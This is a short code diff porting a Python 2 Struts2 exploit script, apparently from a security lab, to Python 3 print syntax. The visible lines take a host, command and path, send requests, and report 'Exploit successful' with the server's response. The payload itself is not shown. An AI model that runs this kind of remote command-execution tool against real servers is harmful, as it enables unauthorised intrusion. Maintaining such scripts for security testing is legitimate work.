@@ -1,5 +1,7 @@
 #coding: utf-8 
 #author: 360云影实验室 (icematcha@360Yunyinglab, Ivan1ee@github.com)
+from __future__ import print_function
+
 import requests
 import sys
 
@@ -14,11 +16,11 @@ def expliot(host, command, path):
 	res1 = requests.get(url1, allow_redirects=False)
 
 	if res.status_code == 200 and res1.status_code != 200:
-		print "Exploit successful:"
-		print res.content
+		print("Exploit successful:")
+		print(res.content)
 	elif res1.status_code == 200 and res.status_code != 200:
-		print "Exploit successful:"
-		print res1.content
+		print("Exploit successful:")
+		print(res1.content)
 	else:
 		print('The target is likely unvulnerable,mabye your struts2 version is too high!')
 
